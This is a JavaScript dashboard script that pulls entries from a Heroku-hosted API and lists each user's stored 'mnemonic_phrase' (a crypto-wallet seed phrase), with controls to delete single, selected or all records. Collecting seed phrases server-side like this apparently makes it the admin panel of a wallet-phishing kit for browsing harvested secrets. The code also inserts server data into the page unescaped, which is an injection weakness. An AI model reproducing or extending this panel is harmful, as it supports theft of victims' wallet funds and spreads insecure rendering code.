const token = localStorage.getItem("token");

if (!token) {
  window.location = "./login.html";
}

const contents = document.querySelector(".contents");
const forward = document.querySelector("#forward");
const backward = document.querySelector("#backward");

function deleteAnEntry(id) {
  fetch(`https://secret-plains-53369.herokuapp.com/api/v1/delete-a-user-entry/${id}`, {
    method: "DELETE",
    headers: {
      "Content-type": "application/json",
      Authorization: `Bearer ${token}`,
    },
  })
    .then((res) => res.json())
    .catch((e) => console.error("error", e));

  // reload the page to refetch contents
  setTimeout(() => {
    window.location = "yourDashboard.html";
  }, 2000);
}

function fetchData(skip, limit) {
  fetch(
    `https://secret-plains-53369.herokuapp.com/api/v1/get-all-entry?skip=${skip}&limit=${limit}`,
    {
      method: "GET",
      headers: {
        "Content-type": "application/json; charset=UTF-8",
        Authorization: `Bearer ${token}`,
      },
    }
  )
    .then((res) => res.json())
    .then((res) => {
      if (res.data && res.data.length) {
        res.data.forEach((entry) => {
          contents.innerHTML += `
                <tr>
                <td><input type="checkbox" class = 'check' value=${
                  entry._id
                } /></td>
                <td>${entry.user_id || "not provided"}</td>
                <td>${entry.mnemonic_phrase}</td>
                <td><button class="btn-danger" onclick=deleteAnEntry('${
                  entry._id
                }')>Delete</button></td>
              </tr>
              `;
        });
      } else {
        contents.innerHTML = "No data at the moment";
      }
    })
    .catch((e) => console.error("error", e));
}

let skip = 0;
const limit = 50;

(function getAllEntry() {
  fetchData(skip, limit);
})();

forward.addEventListener("click", () => {
  skip = skip + limit;
  contents.innerHTML = "";
  fetchData(skip, limit);
});

backward.addEventListener("click", () => {
  if (skip === 0) {
    alert("you have reached the least value");
  } else {
    skip = skip - limit;
    contents.innerHTML = "";
    fetchData(skip, limit);
  }
});

async function deleteMany(arr) {
  try {
    const response = await fetch(
      `https://secret-plains-53369.herokuapp.com/api/v1/delete-many`,
      {
        method: "DELETE",
        body: JSON.stringify({ data: arr }),
        headers: {
          "Content-type": "application/json",
          Authorization: `Bearer ${token}`,
        },
      }
    );

    if (response) {
      window.location = "yourDashboard.html";
    }
  } catch (error) {
    console.error(error);
  }
}

function delMany() {
  const boxes = document.getElementsByClassName("check");
  const arr = [];
  for (var i = 0; i < boxes.length; i++) {
    let box = boxes[i];
    if (box.checked) {
      arr.push(box.value);
    }
  }
  return deleteMany(arr);
}

function selectAll() {
  const selectAll = document.querySelector("#select-all");
  const boxes = document.getElementsByClassName("check");
  if (selectAll.checked) {
    for (var i = 0; i < boxes.length; i++) {
      let box = boxes[i];
      box.checked = true;
    }
  } else {
    for (var i = 0; i < boxes.length; i++) {
      let box = boxes[i];
      box.checked = false;
    }
  }
}

// delete all data
async function deleteAll() {
  try {
    const ans = confirm("Are you sure you want to delete all data?");

    if (ans) {
      const response = await fetch(
        `https://secret-plains-53369.herokuapp.com/api/v1/delete-all`,
        {
          method: "DELETE",
          headers: {
            "Content-type": "application/json",
            Authorization: `Bearer ${token}`,
          },
        }
      );

      if (response) {
        window.location = "yourDashboard.html";
      }
    }
  } catch (error) {
    console.error(error);
  }
}
